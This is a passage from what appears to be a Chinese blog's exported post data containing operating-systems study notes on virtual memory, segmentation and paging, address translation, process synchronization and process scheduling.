由于一次性和驻留性在进程运行时不是必需的，因此可以按照以下方式来运行进程，即一个进程只装入其部分程序和数据便投入运行。在进程运行过程中，若需要访问的指令和数据在内存中，则继续执行；若不在内存中，则系统通过调入功能，把进程需要执行或访问的这部分程序和数据由外存自动装入内存（称为部分装入）；若内存已无足够的空闲区装入这部分信息，则系统把该进程在内存中暂时不用的部分程序和数据从内存中调出到外存（称为部分对换），以便腾出内存空间装入该进程需要调入内存的这部分信息。进程按照这种方式运行，会明显提高内存空间利用率和系统吞吐量。对用户而言，所感觉到的是一个容量更大的内存，通常把它称为虚拟存储器，简称虚存。 实现虚拟内存的必要条件： （1）能够完成虚拟地址到物理地址的转换。程序中使用的是虚拟地址（即逻辑地址），为了实现虚拟存储器，就必须完成虚拟地址到内存物理地址的重定位。虚拟地址的大小可以远远超过实际内存容量的大小，它只受地址寄存器的位数限制，如一个 32 位的地址寄存器，其支持的虚拟地址最大可达 4GB。 （2）实际内存空间。程序装入内存后才能运行，所以内存空间是构成虚拟存储空间的基础。因为虚拟存储器的运行速度接近于内存速度，所以内存空间越大所构成的虚拟存储器的运行速度也就越快。 （3）外存交换区。为了从逻辑上扩大内存空间，一般将外存空间分为文件区和交换区。交换区中存放的是在内、外存之间交换的程序和数据，交换区可大可小。 （4）换入、换出机制。它表现为中断请求机构、淘汰算法及换入、换出软件。 现代操作系统一般都支持虚拟存储器，但不同系统实现虚拟存储器的具体方式存在差异。程序装入内存时，如果以页或段为单位装入，则分别形成请求分页存储管理方式和请求分段存储管理方式；若将分段和分页结合起来，则又可以形成请求段页式存储管理方式。 请求段页式存储管理​ 请求段页式存储管理是建立在段页式存储管理基础上的一种段页式虚拟存储管理。根据段页式存储管理的思想，请求段页式存储管理首先按照程序自身的逻辑结构，将其划分为若干个不同的分段，在每个段内则按页的大小划分为不同的页，内存空间则按照页的大小划分为若干个物理块。内存以物理块为单位进行离散分配，不必将进程所有的页装入内存就可启动运行。当进程运行过程中，访问到不在内存的页时，若该页所在的段在内存，则只产生缺页中断，将所缺的页调入内存；若该页所在的段不在内存，则先产生缺段中断再产生缺页中断，将所缺的页调入内存。若进程需要访问的页已在内存，则对页的管理与段页式存储管理相同。 1．段表及页表机制 请求段页式存储管理中的页表和段表是两个重要的数据结构。页表的结构与请求分页存储管理中的页表相似，段表则在段页式存储管理中的段表基础上增加了一些新的字段，这些新增的字段包括中断位（状态位）、修改位和外存始址等，用来支持实现虚拟存储器。 2．中断处理机制 由于在请求段页式存储管理中内存空间的分配是以页为单位，因此当某个进程在运行过程中发现所要访问的页不在内存时，就要先判断该页所在段的页表是否在内存，若页表已在内存，则只产生缺页中断，由缺页中断处理程序将所缺的页由外存调入内存；若缺页所在段的页表不在内存则表明该段不在内存，这时先产生缺段中断且由缺段中断处理程序为该段在内存中建立一张页表，并将该页表的内存始址存入段表相应的段表项中，然后再产生缺页中断，由缺页中断处理程序将所缺的页由外存调入内存。 3．地址转换 请求段页式存储管理与段页式存储管理的地址转换机制类似，但由于请求段页式存储管理支持虚拟存储器，因此在它的地址转换机制中增加了用于实现虚拟存储器的中断功能和置换功能。请求段页式存储管理中的逻辑地址到内存物理地址转换过程如下。 （1）若系统中设置了快表，则首先在快表中查找该页对应的页表项，若在快表中找到这个页表项，就将该页表项中的物理块号和逻辑地址中的页内地址进行拼接，得到要访问的内存物理地址。 （2）如果快表中没有所需要的页表项，则在内存中查找页表（实际上是同时查找），从该页对应页表项中的中断位来判断该页是否在内存。若在内存，则将该页表项中的物理块号与逻辑地址中的页内地址拼接为内存物理地址，同时将该页表项放入快表。 （3）如果要访问的页还没有调入内存，并且包含该页的段所对应的页表也不在内存（意味着该段不在内存），于是就产生缺段中断将该段的页表调入内存，缺段处理完成后再产生缺页中断；若包含该页的段所对应的页表已在内存，则只产生缺页中断。缺页中断则将该页由外存调入内存，然后通过页表查找得到该页对应的物理块号，并将该物理块与逻辑地址中的页内地址拼接形成要访问的内存物理地址，同时将该页表项放入快表。如图 关联文章：Linux设置虚拟内存","categories":[{"name":"操作系统","slug":"操作系统","permalink":"https://gschaos.club/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"操作系统","slug":"操作系统","permalink":"https://gschaos.club/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}]},{"title":"操作系统-分段存储和段页存储管理","slug":"操作系统-分段存储和段页存储管理","date":"2020-09-26T16:00:00.000Z","updated":"2020-10-25T08:28:41.000Z","comments":true,"path":"操作系统-分段存储和段页存储管理/","link":"","permalink":"https://gschaos.club/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E5%88%86%E6%AE%B5%E5%AD%98%E5%82%A8%E5%92%8C%E6%AE%B5%E9%A1%B5%E5%AD%98%E5%82%A8%E7%AE%A1%E7%90%86/","excerpt":"","text":"分段存储管理的基本原理为了提供内存空间利用率，存储管理从固定分区分配发展到可变分区分配，再发展到分页存储管理。但从用户角度看，以上几种管理方式都存在着自身局限性，难以满足用户在编程和使用上的多方面需求。事实上，程序大多采用分段结构，一个程序可以由主程序段、子程序段和数据段等组成，每个段都从逻辑地址 0 开始编制，有各自的名字和长度，并实现不同的功能。 分段存储： 1．实现原理 在分段存储管理中，系统将程序的逻辑地址空间分成若干个逻辑分段，如主程序段、子程序段、数据段和工作区段等，每个分段都是一组逻辑意义完整的信息集合，且有各自的段名或段号，即在逻辑上是各自独立的。每个段都是从 0 开始编址的一维连续地址空间，其长度由段自身包含的逻辑信息长度决定，所以各段的长度可以不同，整个程序的所有段则构成了二维地址空间。在为程序分配内存时，允许以段为单位将程序离散地装入相邻或不相邻的内存空间中，而每个段则占用一段连续的内存区域，系统通过地址转换机构，将段的逻辑地址转换为实际的内存物理地址，从而使程序能够正确执行。 2．逻辑地址结构 在分段存储管理中，由于程序的地址空间被分成若干个段，因此程序的逻辑地址是二维的，即程序的逻辑地址由段号（段名）和段内地址两部分组成）。段号和段内地址都是从 0 开始编址，段号范围决定了程序中最多允许有多少个段，段内地址的范围则决定了每个段的最大长度。在图示的地址结构中，一个程序最多允许 256（28）个段，每个段的最大长度为 16MB（224）。 在现代操作系统中，绝大多数编译程序都支持分段方式，因此用户程序如何分段这个问题对用户来说是透明的，即可以由编译程序根据源程序的情况自动产生若干个段。 3．段表 在分段存储管理中，程序的各段以离散分配方式装入到内存中相邻或不相邻的空闲分区，即内存中各段之间可以不连续，但每个段在所装入的分区中是连续的。为了使程序正常运行，必须要找到每个逻辑段在内存中具体的物理存储位置，即实现将二维逻辑地址转换为一维物理地址，这项工作通过段映射表（简称段表）来完成。系统为每个程序建立了一个段表，程序的每个段在段表中有一个段表项，这个段表项记录了该段的段名（段号），该段在内存中的起始地址（内存始址）以及该段的长度（段长）等信息。 地址转换与存储保护1．地址转换 分段存储管理也涉及地址转换问题，为了实现段的逻辑地址到内存物理地址的转换，系统为每个程序设置了一个段表，地址转换机构则通过段表来完成逻辑段到内存物理分区的映射。由于段表一般存放在内存中，因此系统使用了段表控制寄存器来存放运行程序（进程）的段表始址（段表在内存中的起始地址）和段表长度（程序的逻辑地址空间中从段号 0 开始划分出的最大段号）。进行地址转换时，先通过段表控制寄存器中存放的段表始址找到段表，然后再从段表中找到对应的段表项来完成逻辑段到内存物理分区的映射。 在地址转换过程中，系统首先将逻辑地址中的段号与段表控制寄存器中的段表长度（程序中允许的最大段号）进行比较，若超过了段表长度，则产生一个段越界中断信号；否则，将段表控制寄存器中的段表始址和逻辑地址中的段号（在段表中又表示段表项的相对位移）相加，找到该段在段表中对应的段表项，并从此段表项中获得该段映射到内存中的起始地址（内存始址）。然后再根据逻辑地址中的段内地址，是否大于段表项中的段长，来判断是否产生段内地址越界，若大于，则产生地址越界中断信号；若不大于（段内地址未越界），则将已获得的该段在内存中的起始地址（内存始址）与逻辑地址中的段内地址相加，得到要访问的内存物理地址。 上过地址转换过程和分页存储相似，一次转换最少需要访问内存两次，所有分段解决的方法与分页存储管理类似,也是设置联想存储器(快表),过程详见： 分页存储管理 后半部分。 段页式存储管理的基本原理段页式存储管理结合了分段存储管理和分页存储管理的优点，在为程序分配内存空间时，采用的是「各段之间按分段存储管理进行分配，每个段内部则按分页存储管理进行分配」的原则。内存空间的管理则只按页的大小划分为若干个的物理块，并且内存中所有物理块从 0 开始顺序编号。在为程序分配内存空间时，允许以页为单位，一次性将一个程序中每个段的所有页装入内存若干相邻或不相邻的物理块中。在段页式存储管理中，由于对段又进行了分页，即逻辑地址空间中的最小单位是页，内存空间也被划分为与页大小相等的若干物理块。分配以页为单位进行，因此每个段包含的所有页在内存中也实现了离散存储。 1．逻辑地址结构 在段页式存储管理中，一个程序的逻辑地址结构由段号、段内页号和页内地址这三部分组成，如图 。 程序的逻辑地址仍然是一个二维地址空间，用户可见的仍然是段号和段内地址，而地址转换机构，则根据系统要求自动把段内地址分为两部分，高位部分为页号（段内页号），低位部分为页内地址。假定逻辑地址长度为 32 位，若段号占 8 位，段内页号占 12 位，页内地址占 12 位，则一个程序最多允许有 256（28）个段，每段最多允许 4096（212）个页，每页的大小为 4KB（212）。 2．数据结构 为了实现段页式存储管理，系统必须设置以下两种数据结构。 （1）段表。系统为每个程序建立一张段表，程序的每个段在段表中有一个段表项，此段表项记录了该段的页表长度和页表始址（页表在内存中存放的起始地址）。 （2）页表。系统为程序中的每个段都建立一张页表，一个段中的每个页在该段的页表中都有一个页表项，每个页表项记录了一个页的页号及其映射的内存物理块号。 地址转换在段页式存储管理中，指令中的逻辑地址到内存物理地址的转换也是由地址转换机构完成的。在地址转换过程中需要使用段表和页表，而程序的段表和页表通常都存放在内存中。因此地址转换机构配置了一个段表控制寄存器，用来记录运行程序的段表长度和段表始址（段表存放在内存的起始地址）。段页式存储管理方式的地址转换过程如图 所示。地址转换时，地址转换机构首先将逻辑地址中的段号与段表控制寄存器中的段表长度（程序中允许的最大段号）比较，若段号大于段表长度，则产生段越界中断；否则未越界，这时利用段表控制寄存器中的段表始址和逻辑地址中的段号（表示段表项的相对位移）相加，获得该段号所对应的段表项在段表中的位置，找到该段表项后，从中获得该段的页表在内存中存放的起始地址（页表始址）和页表长度。若逻辑地址中的段内页号（页号）大于该段表项中的页表长度（该段所允许的最大页号），则产生页越界中断；否则，在该段表项中取出页表始址和逻辑地址中的段内页号（页表项的相对位移）相加，获得该段的页表中该页号（段内页号）对应的页表项位置，并从此页表项中获得该页号所映射的内存物理块号，最后将此物理块号和逻辑地址中的页内地址拼接（由物理块号替换逻辑地址中的段内页号而页内地址不变），形成要访问的内存物理地址。 对段页式存储管理而言，要完成对内存中某个数据的访问，至少要三次访问内存：第一次访问内存是根据段表控制寄存器中的段表始址加上逻辑地址中的段号（段表项的相对位移）在内存中查找程序的段表找到该段号对应的段表项，并在此段表项中找到该段号所对应的页表在内存中的起始地址（页表始址）；第二次访问内存是根据页表始址加上逻辑地址中的段内页号到内存中访问页表找到对应的页表项，并从此页表项中找到该页号（段内页号）映射的物理块号，并将该物理块号与逻辑地址中的页内地址拼接，形成要访问的内存物理地址；第三次才是根据这个内存物理地址去访问该地址中存放的数据。显然，内存访问次数的增加会使计算机的运行速度受到很大的影响。 为了提高地址转换的速度，在段页式存储管理系统中，设置联想存储器（快表）显得尤为重要。快表中存放了当前执行程序最常用的段号、页号（段内页号）和映射的内存物理块号。当要访问内存中某个数据时，可以先根据段号、页号在快表中查找是否有与之对应的表项，若找到，则不必再到内存中去访问段表和页表，直接将快表中找到的表项中所映射的物理块号，与逻辑地址中的页内地址拼接成要访问的内存物理地址；若快表中未找到相应的表项，则仍需两次访问内存（一次访问段表，一次访问页表）来获得内存物理地址，并同时将此次访问的段号、页号与所映射的物理块号填入到快表中；若快表已满，则还需在填入前根据某种算法淘汰快表中的某个表项。","categories":[{"name":"操作系统","slug":"操作系统","permalink":"https://gschaos.club/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"操作系统","slug":"操作系统","permalink":"https://gschaos.club/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}]},{"title":"操作系统-进程同步与存储管理","slug":"操作系统-同步和通信","date":"2020-09-25T00:16:00.000Z","updated":"2020-10-25T08:28:52.000Z","comments":true,"path":"操作系统-同步和通信/","link":"","permalink":"https://gschaos.club/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E5%90%8C%E6%AD%A5%E5%92%8C%E9%80%9A%E4%BF%A1/","excerpt":"","text":"操作系统原理笔记–&gt;同步和通信 并发执行的程序在运行的时候共享系统的资源，一个进程会受到其他进行的制约，为了协调，达到资源共享，就需要实现进程的互斥和同步。 进程同步同步互斥的几个概念（1）进程同步。进程间的同步是指某些进程之间在逻辑上的相互制约关系。 （2）进程互斥。进程互斥是指某一资源同一时间只允许一个进程对其进行访问，这种访问具有唯一性和排他性。进程互斥通常是进程之间争夺互斥资源而引起的，在这种情况下，任何时刻都不允许两个及两个以上的并发进程同时执行那段访问该互斥资源的程序代码。 互斥的实现还会产生两个额外的控制问题：饥饿（Starvation）和死锁（Deadlock）。 （1）饥饿。一个进程所申请的资源总是被优先于自己的其他进程所占有，而长时间处于不能被调度执行的状态（长时间处于就绪或阻塞状态），将这种现象称为「饥饿」。 （2）死锁。一个进程集合中已经占有部分资源的两个或两个以上进程，还需要获得已被其他进程占有的资源才能够继续执行，有可能出现某些进程相互之间都在等待对方占有的资源而无法运行的局面，即在进程集合中的这些进程处于永远的阻塞状态，这就是「死锁」。 进程同步与进程互斥的相似之处是进程互斥实际上是进程同步的一种特殊情况，即逐次使用互斥资源，这也是对进程使用资源次序的一种协调（同步）。因此可以将进程互斥和进程同步统称为进程同步。 进程同步与进程互斥的区别是进程互斥是由互斥资源引起的，这种互斥无法限制进程对资源的访问顺序，即访问是无序的。进程同步则是指相互协作的并发进程之间存在着必然的联系，若当前运行进程执行过程中需要进行同步时，在没有得到协同工作的其他合作进程发来的同步消息之前，当前运行进程则不能继续向前推进（运行）。在进程同步中，虽然互斥资源仍然制约着进程的执行，但协调各进程向前推进的只能是进程同步，即通过进程同步来协调和制约各合作进程的执行，去完成一个共同的任务，即进程同步是在互斥的基础上（大多数情况），通过其他机制实现进程对资源的有序访问。 临界一定时间内只允许一个进程访问的资源成为临界资源。 硬件互斥采用硬件方法实现进程互斥就是通过计算机提供的一些机器指令来实现进程的互斥 实现进程互斥本质上是实现临界区互斥,而实现临界区互斥的关键又是正确的设置进入区和退出区 机器指令是指在一个指令周期内执行完成的指令,而专用机器指令的执行则不会被中断 使用专用机器指令可以在没有其他指令干扰的情况下,获得临界区是否使用的状态信息 专用机器指令通过设置控制临界区访问的布尔型变量,来控制多个进程对临界区的互斥访问 常用的专用机器指令有 3 个:开关中断指令 测试与设置指令以及交换指令。 开关中断指令 最简单粗暴的方法，具体方法是进程在进入临界区之前,先执行 关中断 指令来屏蔽掉所有中断,进程完成临界区的任务后,再执行 开中断 指令将中断打开。 测试与设置指令 TS 采用 TS 方法则要为每个临界资源设置一个整型变量 s,可以将它看成一把锁 若 s 的值为 0(开锁状态),则表示没有进程访问该锁对应的临界资源;若 s 的值为 1(关锁状态),则表示该锁对应的临界资源已被某个进程占用。 交换指令（Swap） 交换指令(Swap)的功能是交换两个字的内容,可以用以下函数描述 。 若要使用交换指令来实现进程互斥,则需要为每个临界资源设置一个整型的全局变量 s 若 s 的值为 0 则表示没有进程在临界区;若 s 的值为 1 则表示有进程在临界区(即正在访问临界资源) 此外,还要为每个进程设置一个整型局部变量 key,只有当 s 的值为 0 并且 key 的值为 1 时,本进程才能进入临界区 进入临界区后,s 的值为 1 且 key 的值为 0,退出临界区时,应将 s 的值置为 0。 虽然使用 TS 和 Swap 指令可以方便地实现进程互斥,但它们都存在以下缺点:当一个进程还在访问临界区时,其他欲进入临界区的进程,只能不断地循环测试 s 的值,显然,不断循环测试 s 造成了 CPU 浪费,这就是 忙等 也就是说,上述两种方法都没有遵循 让权等待 的原则。 存储管理逻辑地址和物理地址 逻辑地址。用户源程序经编译、链接后得到可装入程序。由于无法预先知道程序装入内存的具体位置，因此不可能在程序中直接使用内存地址，只能暂定程序的起始地址为 0。这样，程序中指令和数据的地址都是相对 0 这个起始地址进行计算的，按照这种方法确定的地址称为逻辑地址或相对地址。一般情况下，目标模块（程序）和装入模块（程序）中的地址都是逻辑地址。 逻辑地址空间。一个目标模块（程序）或装入模块（程序）的所有逻辑地址的集合，称为逻辑地址空间或相对地址空间。 物理地址。内存中实际存储单元的地址称为物理地址，物理地址也称为绝对地址或内存地址。为了使程序装入内存后能够正常运行，就必须将程序代码中的逻辑地址转换为物理地址，这个转换操作称为地址转换。 物理地址空间。内存中全部存储单元的物理地址集合称为物理地址空间、绝对地址空间或内存地址空间。由于每个内存单元都有唯一的内存地址编号，因此物理地址空间是一个一维的线性空间。要使装入内存的程序后能够正常运行、互不干扰，就必须将不同程序装入到内存空间的不同区域。 虚拟地址空间。CPU 支持的地址范围一般远大于机器实际内存的大小，对于多出来的那部分地址（没有对应的实际内存）程序仍然可能使用，我们将程序能够使用的整个地址范围称为虚拟地址空间。如 Windows XP 采用 32 位地址结构，每个用户进程的虚拟地址空间为 4GB（232），但可能实际内存只有 2GB。虚拟地址空间中的某个地址称为虚拟地址，而用户进程的虚拟地址就是前面所说的逻辑地址。 分页存储管理的基本原理1．实现原理在分页存储管理中，一个程序的逻辑地址空间被划分成若干个大小相等的区域，每个区域称为页或页面，并且程序地址空间中所有的页从 0 开始顺序编号。相应地，内存物理地址空间也按同样方式划分成与页大小相同的区域，每个区域称为物理块或页框，与页一样内存空间中的所有物理块也从 0 开始顺序编号。在为程序分配内存时，允许以页为单位将程序的各个页，分别装入内存中相邻或不相邻的物理块中。由于程序的最后一页往往不能装满分配给它的物理块，于是会有一定程度的内存空间浪费，这部分被浪费的内存空间称为页内碎片。 分页系统中页的选择对系统性能有重要影响。若页划分得过小，虽然可以有效减少页内碎片，并提高内存利用率，但会导致每个进程需要更多的页，这样会使分页系统中用于页管理的页表增大，而占用更多的内存空间。若页划分得过大，虽然可以减少页表大小，并提高页的置换速度，但会导致页内碎片增大，而且当一个页大到能装下一个程序时就退化为分区存储管理了。因此页的大小应适中，分页系统中页的大小取决于机器的地址结构，一般设置为 2 的整数幂，通常为 512B～8KB。 2．逻辑地址结构在分页存储管理中，程序中的逻辑地址被转换为页号和页内地址。这个转换工作在程序执行时由系统硬件自动完成，整个过程对用户透明。因此用户编程时不需要知道逻辑地址与页号和页内地址的对应关系，只需要使用一维的逻辑地址。 程序的一维逻辑地址空间经过系统硬件自动分页后，形成「页号 + 页内地址」的地址结构。在图 所示的地址结构中，逻辑地址通过页号和页内地址来共同表示。其中，0～11 位是页内地址，即每个页的大小是 4KB；12～31 位是页号，即地址空间最多允许有 1M 个页。一维逻辑地址与页号和页内地址的关系是（注：页长即一页的大小） 一维逻辑地址 = 页号 × 页长 + 页内地址 3．数据结构为了实现分页存储管理，系统主要设置了以下两种表格。 （1）页表 在分页系统中，允许程序所有的页以离散方式分别存储在内存不同的物理块里，为了使程序能够正确运行，必须在内存空间中找到存放每个页的物理块。因此操作系统为每个程序（进程）建立了一张页映射表，简称页表（Page Table），用来存储页号及其映射（装入）的内存物理块号。最简单的页表由页号及其映射的物理块号组成。由于页表的长度由程序所拥有页的个数决定，故每个程序的页表长度通常不同。 （2）内存分配表 为了正确地将一个页装入到内存的某一物理块中，就必须知道内存中所有物理块的使用情况，因此系统建立一张内存分配表来记录内存中物理块的分配情况。由于每个物理块的大小相同且不会改变大小，因此最简单的办法是用一张位示图（Bitmap）来构成内存分配表。位示图是指在内存中开辟若干个字，它的每一位与内存中的一个物理块相对应。每一位的值可以是 0 或 1，当取值为 0 时，表示对应的物理块空闲；当取值为 1 时，表示对应的物理块已分配。此外，在位示图中增加一个字节，来记录内存当前空闲物理块的总数。 4. 地址保护 基本地址转换 在分页存储管理中,系统为每个程序建立了一张页表并存放于内存中 当程序被装入内存但尚未运行时,页表始址(页表在内存中的起始地址)和页表长度(程序逻辑地址空间从页号 0 开始划分出的最大页号)等信息被保存到为该程序(进程)创建的 PCB 中,或保存到请求表中 一旦进程调度程序调度该进程运行时,其 PCB 中保存的页表始址和页表长度信息(或请求表中这两个的信息)便被装入到页表控制寄存器中,基本地址转换过程如图 所示 从基本地址转换过程可知 物理地址 = 物理块号 页长 + 页内地址,由于页表驻留在内存,因此当 CPU 依据指令中的逻辑地址进行操作时,至少要两次访问内存 为了提高地址转换的速度,一种行之有效的方法是在地址转换机构中,增加一个具备并行查找能力的高速缓冲寄存器,又称联想存储器(Associative Memory)来构成一张快表,快表中保存着当前运行进程最常用的页号及其映射的物理块号 具有快表的地址转换 在快表中查找和在内存中查找是同时进行的,只不过在内存页表中查找的速度要慢一些,当快表中找到含有该页号的页表项时,则终止内存页表的查找。 由于成本的关系,快表不可能做得很大,通常只存放 32~1024 个页表项 据统计,从快表中能找到所需页表项的概率可达 90% 以上。 页的保护 页的保护分为两个方面:一是在逻辑地址转换成物理地址时的保护,通过页号与页表长度的比较防止地址越界;二是在实现信息共享时,对共享信息的保护 通常是在页表中增加一些标志位来设置存取控制字段,一般设置只读 读写 读和执行等权限 如果某进程试图去执行一个只允许读的内存物理块,系统就会发出访问性中断。","categories":[{"name":"操作系统","slug":"操作系统","permalink":"https://gschaos.club/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"操作系统","slug":"操作系统","permalink":"https://gschaos.club/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}]},{"title":"操作系统-线程与进程","slug":"操作系统-基础","date":"2020-09-23T13:30:00.000Z","updated":"2020-10-25T08:28:47.000Z","comments":true,"path":"操作系统-基础/","link":"","permalink":"https://gschaos.club/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E5%9F%BA%E7%A1%80/","excerpt":"","text":"操作系统原理笔记–&gt;线程与进程.____ 进程切换进程切换的实质是回收当前运行进程对 CPU 的控制权,并将 CPU 控制权转交给新调度的就绪进程. 1． 进程上下文除进程实体之外，进程的运行还需要其他硬件环境的支持，如程序状态字 PSW、段表、页表等数据结构。一个进程运行时，CPU 所有寄存器中的内容、进程的状态以及运行栈中的内容被称为进程的上下文。进程上下文是操作系统用来管理和控制进程的内部数据集合，进程在其上下文中运行。进程上下文可分成以下三部分。 （1）系统级上下文。操作系统内核进程使用的进程上下文信息集合，主要包括 PCB 与逻辑地址到物理地址转换的核心数据结构，如段表、页表及核心栈等。 （2）寄存器上下文。CPU 中所有寄存器的信息集合，如通用寄存器、指令寄存器、程序状态字寄存器和栈指针等。栈指针可以是指向核心栈的指针，也可以是指向用户栈的指针。 （3）用户级上下文。用户进程访问和修改的进程上下文信息集合，主要包括进程的程序段、数据段、用户栈和共享存储区。用户级上下文占用进程的虚拟地址空间，交换到外存的分页或分段（内存中的信息暂存于外存，见第 4 章）仍然是进程用户级上下文的组成部分。 当内核进行进程切换时，它需要保存当前运行进程的进程上下文，以便再次执行该进程时，能够恢复到进程被切换前的运行现场和环境而继续正常运行。发生进程切换时，新、旧进程进行上下文切换。 2．进程切换的时机进程切换是中断驱动的，引起进程切换的中断可分为以下三种。 （1）中断。中断发生时，操作系统保存当前运行进程（称为旧进程）的现场信息，调度新进程运行。 （2）异常。当 CPU 在一条指令执行时，检查到有一个或多个预定义的条件或错误产生时就会产生异常，这时，终止当前运行进程的执行，CPU 转去执行异常处理程序。 （3）系统调用。系统调用是对操作系统服务的一种显式请求。阻塞型系统调用发生时，则当前运行进程被阻塞，此时 CPU 转去执行进程调度程序。 中断发生时，操作系统暂停当前运行进程的执行，将 CPU 的执行模式切换到内核态，并通过执行进程调度程序选中一个新的就绪进程准备投入运行，这时需完成新、旧进程上下文的切换。 3．进程上下文切换进程切换发生时，当前运行进程让出其占用的 CPU，由操作系统保存当前运行进程（旧进程）的上下文环境，并设置被进程调度程序选中的就绪进程（新进程）的上下文环境，这一过程称为进程的上下文切换。 进程的上下文环境包括中断处理可能改变的所有信息，以及恢复被中断进程运行时需要的所有信息。进程切换时，操作系统将旧进程的寄存器上下文保存到核心栈的一个上下文层。当中断返回时，由操作系统内核从核心栈中恢复，为旧进程所保存的上下文。进程切换主要包括以下 6 个步骤。 （1）当前运行进程（旧进程）被中断时，保存其 CPU 现场信息。 （2）对被中断的当前运行进程进行 PCB 更新，包括改变进程状态和其他相关信息。 （3）将被中断的当前运行进程的 PCB 移入适当的队列（因时间片到则移入进程就绪队列，因某事件发生则移入相应的进程阻塞队列）。 （4）由进程调度程序选中一个就绪进程（新进程），为其设置执行的上下文环境并对其 PCB 进行更新。 （5）修改新进程的地址空间，更新新进程的内存管理信息。 （6）恢复被选中的新进程最后一次进程上下文切换时所保存的 CPU 现场信息。 进程上下文切换时，当前运行进程（旧进程）对 CPU 的控制权被回收，其状态转变为就绪态或阻塞态。 进程调度的方式和时机1．进程调度方式为了实现不同的 CPU 调度目标，不同系统可以使用不同的进程调度方式。一般来说，进程的调整方式可分为非抢占式（非剥夺式）调度和抢占式（剥夺式）调度两类。 （1）非抢占式调度。在使用非抢占式调度方式的系统中，进程调度算法选中一个进程后就会让该进程一直运行下去，直到该进程运行结束自动释放 CPU 的使用权。或者在运行过程中因发生某等待事件而阻塞时，才将 CPU 的使用权返还给进程调度程序。非抢占式调度的优点是实现简单、系统开销小。但系统出现了紧急事件时不能立即处理，即实时性差。因此，非抢占式调度方式不适用于实时系统和分时系统。 （2）抢占式调度。在没有发生等待事件的情况下也允许进程调度程序暂停当前运行进程的执行，并按照某种原则将当前运行进程占用的 CPU 分配给另一个更重要、更紧迫的进程使用。在这种调度方式下，被暂停运行的进程其他所需资源均已满足而只是被剥夺了 CPU 的使用权，故其状态应由运行状态返回到就绪状态，并将其 PCB 插入到进程就绪队列。常用的抢占原则主要有以下两种。 ① 高优先级原则。这种抢占原则允许拥有更高优先级的进程抢占当前运行进程所使用的 CPU。在使用高优先级抢占原则的系统中，如果有更高优先级的就绪进程到达时，则进程调度程序立即暂停当前运行进程的执行（由运行态变为就绪态），然后将 CPU 分配给这个拥有更高优先级的就绪进程使用。 ② 时间片原则。在分时系统中各就绪进程按照时间片轮流执行，当运行进程的时间片到时，则进程调度程序立即暂停当前运行进程的执行（由运行态变为就绪态），然后将 CPU 分配给下一个就绪进程。 因此抢占式调度方式适合于大多数实时系统以及所有分时系统。抢占式调度能够防止一个进程较长时间占用 CPU，尤其是能够满足实时系统对响应时间的要求，且能获得较好的响应时间。但是，抢占式调度会增加系统中进程切换的频率，与非抢占式调度相比则增加了进程切换的开销。 2．进程调度的时机进程调度程序调度性能的优劣将直接影响 CPU 的利用率，因此什么时候运行进程调度程序是操作系统处理进程调度的关键。进程调度的原则是始终使 CPU 处于忙状态，一旦 CPU 空闲就立即进行调度。引起进程调度程序运行的时机主要有两个：一个是当前运行进程执行结束而终止，或因等待某个事件的完成而无法继续执行，这时就需要启动进程调度程序来选择一个新的就绪进程投入运行；另一个是在抢占式调度系统中，进程就绪队列中出现了优先级更高的进程，或当前运行进程的时间片已经用完，这时需要剥夺当前运行进程的 CPU 使用权，并将其分配给更高优先级的就绪进程或以时间片为单位轮转的下一个就绪进程。引起进程调度的原因主要有以下 4 个。 （1）创建一个新进程后。创建一个新进程后父进程和子进程都处于就绪状态，这时需要确定是父进程先运行还是子进程先运行，即可以由进程调度程序来选择。 （2）运行进程终止。运行进程正常结束时需要向系统发出一个「进程结束」的系统调用。这时进程调度程序运行，并从进程就绪队列中选择一个新的就绪进程，然后将 CPU 分配给它。 （3）运行进程阻塞。当运行进程因发生了某种等待事件（如 I/O 请求）或阻塞在某个信号量（信号量概念见第 3 章）时，进程调度程序则调度另一个就绪进程运行。 （4）支持抢占式调度的系统中，即使没有新的就绪进程出现，为了让所有就绪进程能够轮流使用 CPU，也会在下面两种情况下引起进程调度。 ① 时间片到。发现当前运行进程时间片到时引起进程调度，将 CPU 分配给下一个就绪进程。 ② 进程的优先级发生变化。在按优先级调度的系统中，当进程优先级发生变化时引起进程调度。 现代操作系统在以下三种情况下不允许进行进程的调度和切换。 （1）中断处理过程中。由于中断处理通常不属于某一进程，因此不应作为进程的程序段而被剥夺 CPU。 （2）进程在操作系统内核的临界区（临界区和临界资源概念见第 3 章）中。用户进程通过陷入进入操作系统内核，为实现对临界区的互斥访问，通常以加锁方式防止其他进程进入该临界区。为了加快对临界资源的释放，在该用户进程访问临界资源期间不允许切换到其他进程去执行。 （3）在需要完全屏蔽中断的原子操作执行过程中。操作系统中常用的原子操作加锁、开锁、中断现场保护和恢复等，原子操作在执行过程中不允许进行进程切换。 3．进程调度实现出现进程调度后，主要完成的任务是进程切换。 （1）保存当前运行进程的现场信息。当运行进程因某种原因（如时间片到或等待 I/O）需要放弃 CPU 时，进程调度程序将运行进程的 CPU 现场信息，保存到内存该进程 PCB 中的 CPU 状态保护区。 （2）选择即将运行的进程。进程调度程序根据某种调度算法从进程就绪队列中挑选一个进程，把它的状态由就绪状态改为运行状态，并准备将 CPU 分配给它。 （3）为新选中的进程恢复现场。将选中进程在内存 PCB 保存的 CPU 现场信息送入 CPU 的各寄存器，然后将 CPU 的使用权交给选中的进程，使它从上次中断运行的断点处恢复正常运行。 线程线程可以简单地理解为 CPU 调度和执行的最小单元 线程的定义有以下 4 种不同的提法 (1)进程内的一个执行单元 (2)进程内的一个可独立调度的实体 (3)线程是进程中一个相对独立的控制流序列 (4)线程是执行的上下文 在引入线程的操作系统中,进程是资源分配的实体,而线程是进程中能够并发执行的实体,是能够被系统独立调度和分派的基本单位 线程除具有为保证其运行而必不可少的资源外,基本不拥有系统资源 